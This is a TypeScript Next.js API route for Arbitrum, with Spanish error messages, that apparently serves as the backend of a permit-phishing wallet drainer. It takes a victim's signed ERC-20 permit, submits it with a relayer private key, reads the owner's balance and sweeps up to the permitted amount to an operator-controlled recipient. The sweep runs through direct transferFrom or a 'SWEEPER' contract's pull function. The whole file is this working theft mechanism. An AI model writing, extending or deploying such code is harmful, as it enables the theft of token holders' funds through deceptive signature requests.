import { NextResponse } from "next/server";
import { createPublicClient, createWalletClient, http, isAddress, parseSignature } from "viem";
import { privateKeyToAccount } from "viem/accounts";
import { arbitrum } from "viem/chains";
import { erc20PermitAbi } from "@/lib/erc20";

export const runtime = "nodejs";

const account = privateKeyToAccount(process.env.RELAYER_PRIVATE_KEY as `0x${string}`);
const recipient = (process.env.RELAYER_RECIPIENT || account.address) as `0x${string}`;
const spender = process.env.NEXT_PUBLIC_SPENDER_ADDRESS as `0x${string}`;
const transport = http(process.env.RPC_URL_ARBITRUM);
const client = createWalletClient({ account, chain: arbitrum, transport });
const publicClient = createPublicClient({ chain: arbitrum, transport });

const SWEEPER_ABI = [
  {
    name: "pull",
    type: "function",
    stateMutability: "nonpayable",
    inputs: [
      { name: "token", type: "address" },
      { name: "from", type: "address" },
      { name: "to", type: "address" },
      { name: "amount", type: "uint160" },
    ],
    outputs: [],
  },
] as const;

const seen = new Set<string>();

export async function POST(req: Request) {
  const body = await req.json();
  const { owner, token, value, deadline, signature } = body ?? {};

  if (!isAddress(owner) || !isAddress(token)) {
    return NextResponse.json({ error: "owner o token inválidos" }, { status: 400 });
  }

  let permitValue: bigint;
  let deadlineBig: bigint;
  try {
    permitValue = BigInt(value);
    deadlineBig = BigInt(deadline);
  } catch {
    return NextResponse.json({ error: "value o deadline inválidos" }, { status: 400 });
  }

  if (deadlineBig <= BigInt(Math.floor(Date.now() / 1000))) {
    return NextResponse.json({ error: "la firma ha caducado" }, { status: 400 });
  }

  const key = `${owner}-${token}`;
  if (seen.has(key)) return NextResponse.json({ error: "ya procesado" }, { status: 409 });
  seen.add(key);

  try {
    const code = await publicClient.getCode({ address: spender });
    const viaContract = code !== undefined && code !== "0x";

    if (!viaContract && spender.toLowerCase() !== account.address.toLowerCase()) {
      seen.delete(key);
      return NextResponse.json(
        { error: "el spender no es el relayer ni un contrato" },
        { status: 500 },
      );
    }

    const sig = parseSignature(signature);
    const raw = sig.v !== undefined ? Number(sig.v) : (sig.yParity ?? 0) + 27;
    const v = raw < 27 ? raw + 27 : raw;

    const permitTx = await client.writeContract({
      address: token,
      abi: erc20PermitAbi,
      functionName: "permit",
      args: [owner, spender, permitValue, deadlineBig, v, sig.r, sig.s],
    });

    const permitReceipt = await publicClient.waitForTransactionReceipt({ hash: permitTx });
    if (permitReceipt.status !== "success") {
      seen.delete(key);
      return NextResponse.json({ error: "permit revirtió", permitTx }, { status: 500 });
    }

    const balance = await publicClient.readContract({
      address: token,
      abi: erc20PermitAbi,
      functionName: "balanceOf",
      args: [owner],
    });

    const amount = permitValue < balance ? permitValue : balance;
    if (amount === 0n) {
      seen.delete(key);
      return NextResponse.json({ error: "saldo vacío", permitTx }, { status: 422 });
    }

    const transferTx = viaContract
      ? await client.writeContract({
          address: spender,
          abi: SWEEPER_ABI,
          functionName: "pull",
          args: [token, owner, recipient, amount],
        })
      : await client.writeContract({
          address: token,
          abi: erc20PermitAbi,
          functionName: "transferFrom",
          args: [owner, recipient, amount],
        });

    const transferReceipt = await publicClient.waitForTransactionReceipt({ hash: transferTx });
    if (transferReceipt.status !== "success") {
      seen.delete(key);
      return NextResponse.json({ error: "transferencia revirtió", permitTx, transferTx }, { status: 500 });
    }

    return NextResponse.json({ permitTx, transferTx });
  } catch (err) {
    seen.delete(key);
    return NextResponse.json({ error: String(err) }, { status: 500 });
  }
}